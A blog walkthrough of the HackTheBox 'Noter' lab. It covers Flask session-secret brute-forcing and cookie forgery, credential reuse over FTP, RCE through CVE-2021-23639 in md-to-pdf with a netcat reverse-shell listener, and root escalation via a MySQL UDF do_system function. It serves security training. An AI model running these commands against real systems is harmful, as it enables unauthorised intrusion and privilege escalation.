<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HackTheBox - Noter Walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="Noter was an interesting box, user was easy to get, required enumerating extensively." /><meta property="og:description" content="Noter was an interesting box, user was easy to get, required enumerating extensively." /><link rel="canonical" href="https://jayden-lind.github.io/posts/htb-noter/" /><meta property="og:url" content="https://jayden-lind.github.io/posts/htb-noter/" /><meta property="og:site_name" content="Jayden Lind - Portfolio" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-20T00:00:00+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Noter Walkthrough" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-30T21:15:56+10:00","datePublished":"2022-05-20T00:00:00+10:00","description":"Noter was an interesting box, user was easy to get, required enumerating extensively.","headline":"HackTheBox - Noter Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://jayden-lind.github.io/posts/htb-noter/"},"url":"https://jayden-lind.github.io/posts/htb-noter/"}</script><title>HackTheBox - Noter Walkthrough | Jayden Lind - Portfolio</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Jayden Lind - Portfolio"><meta name="application-name" content="Jayden Lind - Portfolio"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://jayden-lind.github.io/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Jayden Lind - Portfolio</a></div><div class="site-subtitle font-italic">Homelab, Software Engineering, Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/homelab/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>HOMELAB</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/jayden-lind" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['jayden','linds.com.au'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/jayden-lind/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Noter Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox - Noter Walkthrough</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1652968800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 20, 2022 </em> </span> <span> Updated <em class="" data-ts="1659179756" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 30, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/jayden-lind">jayden-lind</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1500 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>Noter was an interesting box, user was easy to get, required enumerating extensively.</p><p><strong>Scanning</strong></p><p>Start off with a nmap</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-oA</span> 10.10.11.160 10.10.11.160
Nmap scan report <span class="k">for </span>10.10.11.160
Host is up <span class="o">(</span>0.015s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
5000/tcp open http Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>There is 3 ports open, SSH, FTP and a webserver running on port 5000. Let's access the web server on port 5000 from a web browser and see what we can find.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.11.160:5000
</pre></table></code></div></div><p><a href="/img/2022/05/image.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Trying the default credentials on http://10.10.11.160:5000/login resulted in no success.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>admin:admin
admin:password
admin:
administrator:password
</pre></table></code></div></div><p><a href="/img/2022/05/image-1.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-1.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>It does however let us register, so lets try that.</p><p>After registering with junk credentials, we are now able to login.</p><p><a href="/img/2022/05/image-2.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-2.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Upon logging in, we have a valid session with a cookie, let's checkout if after logging in we can see any more directories, and see if we can find any other useful files.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-u</span> http://10.129.173.105:5000/FUZZ <span class="nt">-H</span> <span class="s2">"Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8c"</span>
register                <span class="o">[</span>Status: 200, Size: 2646, Words: 523, Lines: 95, Duration: 247ms]
login                   <span class="o">[</span>Status: 200, Size: 1967, Words: 427, Lines: 67, Duration: 277ms]
<span class="nb">logout</span>                  <span class="o">[</span>Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 234ms]
dashboard               <span class="o">[</span>Status: 200, Size: 2361, Words: 560, Lines: 83, Duration: 220ms]
notes                   <span class="o">[</span>Status: 200, Size: 1703, Words: 388, Lines: 61, Duration: 224ms]
VIP                     <span class="o">[</span>Status: 200, Size: 1742, Words: 398, Lines: 58, Duration: 225ms]
</pre></table></code></div></div><p>These pages are already navigatable from just being logged in, so there is nothing new here.<br />Inspecting the session cookie, it has the format like below. This cookie format looks like a JWT, lets try it out on https://jwt.io to validate if it is a valid JWT.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8c
</pre></table></code></div></div><p><a href="/img/2022/05/image-3.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-3.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>It's not a valid JWT, but it almost follows the same format, with the string before the first "." being base64 encoded. Looking back at what the service was identified on port 5000, being **Werkzeug**, lets search what cookie types can be generated by WerkZeug. We find <a href="https://werkzeug.palletsprojects.com/en/0.16.x/contrib/securecookie/">Secure Cookie</a>. After playing with this, the output is not the correct cookie type. After finding <a href="https://www.kirsle.net/wizards/flask-session.cgi">Flask Session Cookie Decoder</a> and entering our session cookie, we can conclude that the cookie type is used by flask. This cookie is signed with a secret key that is stored in the <a href="https://flask.palletsprojects.com/en/2.1.x/config/">app.config</a> class. If we were able to brute force the secret key, we could then forge our own cookie with any username and get access to other users notes.</p><p>Using <a href="https://pypi.org/project/flask-unsign/">flask-unsign</a>, we are able to brute force the "secret" key.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>flask-unsign <span class="nt">--unsign</span> <span class="nt">--cookie</span> <span class="s1">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.Yn0P8Q.XaXAKhvjJ6uPpxdUw1V0KPitAW8'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Session decodes to: <span class="o">{</span><span class="s1">'logged_in'</span>: True, <span class="s1">'username'</span>: <span class="s1">'jayden'</span><span class="o">}</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No wordlist selected, falling back to default wordlist..
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting brute-forcer with 8 threads..
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempted <span class="o">(</span>2048<span class="o">)</span>: <span class="nt">-----BEGIN</span> PRIVATE KEY-----<span class="k">***</span>
<span class="o">[</span>+] Found secret key after 16768 attempts-FF35-D147FB
<span class="s1">'secret123'</span>
</pre></table></code></div></div><p>Then confirmed that this was the secret key for signing cookies, by generating my own cookie again and then confirming still able to login.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>flask-unsign <span class="nt">--sign</span> <span class="nt">--cookie</span> <span class="s2">"{'logged_in': True, 'username' :'admin'}"</span> <span class="nt">--secret</span> secret123
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoIo2Q.spOR6sUSMWZOX5_xKq9iiwkfTFk
</pre></table></code></div></div><p><a href="/img/2022/05/image-4.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-4.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>With this we can now start brute forcing usernames to try find valid usernames.</p><p>To make this brute forcing easier, I wrote this quick Flask API that generates a cookie and returns the cookie in GET response body.<br /><a href="https://github.com/Jayden-Lind/HTB-Noter/blob/main/cookie_flask.py">cookie_flask.py</a> - This creates an API endpoint on port 5000.<br /><a href="https://github.com/Jayden-Lind/HTB-Noter/blob/main/login.py">login.py</a> - This uses the above cookie_flask.py to grab a cookie, then attempt to load the dashboard with that cookie.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/noter]
└──╼ <span class="nv">$python</span> login.py 
blue
</pre></table></code></div></div><p>blue is a valid username, using the same cookie_flask.py we can generate our own cookie and use this to find notes under the "blue" user.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌─[✗]─[jayden@JD-Desktop]─[~/ctf/noter]
└──╼ <span class="nv">$curl</span> http://localhost:5000/?username<span class="o">=</span>blue
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YooFiQ.DaITx8UmoSeXCp3mlh6W8iFO5W4
</pre></table></code></div></div><p><a href="/img/2022/05/image-5.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-5.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>If we look at notes for the "blue" user, http://10.10.11.160:5000/note/1/, we can see this note.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>Written by ftp_admin on Mon Dec 20 01:52:32 2021

   Hello, Thank you <span class="k">for </span>choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is <span class="s1">'blue'</span> and the password is <span class="s1">'blue@Noter!'</span><span class="nb">.</span>
Make sure to remember them and delete this.  
<span class="o">(</span>Additional information are included <span class="k">in </span>the attachments we sent along the
Email<span class="o">)</span>  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
</pre></table></code></div></div><p>We are now able to login to the FTP server with the blue user.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/noter]
└──╼ <span class="nv">$ftp</span> 10.10.11.160
Connected to 10.10.11.160.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.160:jayden<span class="o">)</span>: blue
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
<span class="nt">-rw-r--r--</span>    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
ftp&gt; 
</pre></table></code></div></div><p>After downloading policy.pdf, it tells us the password policies for the organisation. Under "Password Creation" line 4, it indicates</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>1. Default user-password generated by the application is <span class="k">in </span>the format of <span class="s2">"username@site_name!"</span> <span class="o">(</span>This applies to all your applications<span class="o">)</span>

</pre></table></code></div></div><p>The other username we got was from the note, "ftp_admin". This would make the default ftp_admin password "ftp_admin@Noter!" lets try this on the FTP server.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/noter]
└──╼ <span class="nv">$ftp</span> 10.10.11.160
Connected to 10.10.11.160.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.160:jayden<span class="o">)</span>: ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
<span class="nt">-rw-r--r--</span>    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
226 Directory send OK.
ftp&gt; 
</pre></table></code></div></div><p>Sure enough it works! Lets download these zips, as they look to be the source code for this server. Under the app_backup_1635803546.zip/app.py we can see the MySQL credentials hardcoded into the file, note these for later.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/noter/zip/1635]
└──╼ <span class="nv">$cat</span> app.py | <span class="nb">grep</span> <span class="nt">-i</span> mysql
from flask_mysqldb import MySQL
<span class="c"># Config MySQL</span>
app.config[<span class="s1">'MYSQL_HOST'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'localhost'</span>
app.config[<span class="s1">'MYSQL_USER'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'root'</span>
app.config[<span class="s1">'MYSQL_PASSWORD'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'Nildogg36'</span>
app.config[<span class="s1">'MYSQL_DB'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'app'</span>
app.config[<span class="s1">'MYSQL_CURSORCLASS'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'DictCursor'</span>

</pre></table></code></div></div><p>Browsing through app_backup_1638395546.zip source code we find that the export markdown to PDF and import markdown to PDF feature is implemented. It uses the library <a href="https://www.npmjs.com/package/md-to-pdf">md-to-pdf</a> to achieve this feature. Searching CVE's for md-to-pdf leads us to <a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">CVE-2021-23639</a>, which allows us to have RCE. To exploit this, we need to use the "Export directly from cloud" feature of the VIP section. This is only visible while logged in as the "blue" user, as regular users do not have "VIP".</p><p><a href="/img/2022/05/image-6.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/05/image-6.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>To successfully get RCE, we need the "Export directly from cloud" feature to point to a markdown file that we control. This is easy to achieve by running simple webserver on port 80, and pointing the "Export directly from cloud" feature to our local machine, http://VPN_IP:5000/test.md .</p><p>I created the paylod and bash reverse shell script files below and 2 commands, we can chain these to get a reverse shell.<br /><a href="https://github.com/Jayden-Lind/HTB-Noter/blob/main/test.md">test.md</a><br /><a href="https://github.com/Jayden-Lind/HTB-Noter/blob/main/reverse.sh">reverse.sh</a></p><h3>Start Python webserver</h3><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-nvlp</span> 4444
<span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><h3>Start netcat listener on port 4444</h3><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/noter/zip/1635]
└──╼ <span class="nv">$nc</span> <span class="nt">-nvlp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.160 49974
<span class="nb">whoami
</span>svc
<span class="nb">pwd</span>
/home/svc/app/web
<span class="nb">ls
</span>app.py
misc
templates
<span class="nb">cat</span> /home/svc/user.txt
&lt;strong&gt;eda1d835fa77d477bded5bdda7491a44&lt;/strong&gt;
</pre></table></code></div></div><p><strong>We have succesfully got the user flag!</strong></p><h2>Root</h2><p>Upgrade netcat shell to a fully interactive TTY shell to make life easier.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
Ctrl + Z
<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nv">$ </span><span class="nb">fg</span>
</pre></table></code></div></div><p>After enumerating all services on the box, there is nothing that sticks out. We still have the root credentials for MySQL. Looking at privilege escalation techniques in MySQL leads us to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library">Privilege Escalation via library</a>. Download and copy the <a href="https://www.exploit-db.com/exploits/1518">UDF library</a> to the box, and compile it (I put it in the home directory)</p><p>['MYSQL_USER'] = 'root' <br />['MYSQL_PASSWORD'] = 'Nildogg36'</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>svc@noter:~<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
Enter password: 
MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use mysql<span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; create table npn<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; insert into npn values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/svc/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from npn into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s2">"cat /root/root.txt &gt; /tmp/root.txt ; chmod 777 /tmp/root.txt"</span><span class="o">)</span><span class="p">;</span>
MariaDB <span class="o">[</span>mysql]&gt; <span class="nb">exit
</span>Bye
svc@noter:/tmp<span class="nv">$ </span><span class="nb">cat </span>root.txt 
&lt;strong&gt;6cc87060b916eefafa8f32950f09248f
&lt;/strong&gt;
svc@noter:/tmp<span class="nv">$ </span>
</pre></table></code></div></div><h1>root successfully obtained!</h1></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Noter%20Walkthrough%20-%20Jayden%20Lind%20-%20Portfolio&url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-noter%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a 